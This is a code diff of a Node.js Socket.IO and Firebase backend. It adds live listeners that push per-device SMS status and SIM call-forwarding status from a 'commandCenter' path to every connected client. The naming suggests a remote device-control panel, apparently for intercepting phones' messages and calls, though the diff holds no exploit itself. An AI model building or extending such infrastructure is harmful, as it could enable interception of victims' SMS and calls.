@@ -246,11 +246,14 @@ app.get("/api/brosreply/:uid", async (req, res) => {
   try {
     const uid = req.params.uid;
 
+    // stop previous listener if any
     stopReplyWatcher(uid);
 
+    // send initial data once
     const snap = await rtdb.ref(`checkOnline/${uid}`).get();
     const data = snap.exists() ? { uid, ...snap.val() } : null;
 
+    // then start live listening
     startReplyWatcher(uid);
 
     return res.json({
@@ -263,6 +266,95 @@ app.get("/api/brosreply/:uid", async (req, res) => {
     res.status(500).json({ success: false });
   }
 });
+
+/* ======================================================
+      SMS & SIM-FORWARD LIVE SECTIONS
+====================================================== */
+const smsLiveWatchers = new Map();
+const simForwardWatchers = new Map();
+
+/* ---------- SMS STATUS LIVE LISTENER ---------- */
+function startSmsLive(uid) {
+  const ref = rtdb.ref(`commandCenter/smsStatus/${uid}`);
+
+  ref.on("value", (snap) => {
+    if (!snap.exists()) {
+      console.log("⚪ SMS-STATUS EMPTY →", uid);
+      io.emit("smsStatusUpdate", {
+        uid,
+        success: true,
+        data: [],
+        message: "No SMS status",
+      });
+      return;
+    }
+
+    const raw = snap.val();
+    const list = [];
+
+    Object.entries(raw).forEach(([smsId, obj]) => {
+      list.push({
+        smsId,
+        uid,
+        ...obj,
+      });
+    });
+
+    list.sort((a, b) => (b.at || 0) - (a.at || 0));
+
+    console.log("🔥 LIVE SMS STATUS:", uid, list);
+
+    io.emit("smsStatusUpdate", {
+      uid,
+      success: true,
+      data: list,
+    });
+  });
+
+  smsLiveWatchers.set(uid, ref);
+  console.log("🎧 SMS Live watcher started →", uid);
+}
+
+/* ---------- SIM FORWARD LIVE LISTENER ---------- */
+function startSimForwardLive(uid) {
+  const ref = rtdb.ref(`simForwardStatus/${uid}`);
+
+  ref.on("value", (snap) => {
+    if (!snap.exists()) {
+      console.log("⚪ SIM-FORWARD EMPTY →", uid);
+      io.emit("simForwardUpdate", {
+        uid,
+        success: true,
+        data: [],
+        message: "No SIM forward status",
+      });
+      return;
+    }
+
+    const raw = snap.val();
+    const list = [];
+
+    Object.entries(raw).forEach(([slot, obj]) => {
+      list.push({
+        simSlot: Number(slot),
+        ...obj,
+      });
+    });
+
+    list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
+
+    console.log("🔥 LIVE SIM-FORWARD:", uid, list);
+
+    io.emit("simForwardUpdate", {
+      uid,
+      success: true,
+      data: list,
+    });
+  });
+
+  simForwardWatchers.set(uid, ref);
+  console.log("🎧 SIM Forward watcher started →", uid);
+}
 
 /* ======================================================
       ADMIN UPDATE → PUSH TO ALL DEVICES
@@ -501,9 +593,6 @@ app.get("/", (_, res) => {
   res.send("RTDB + Socket.IO Backend Running");
 });
 
-/* ======================================================
-      START SERVER
-====================================================== */
 server.listen(PORT, () => {
   console.log(`🚀 Server running on PORT ${PORT}`);
 });
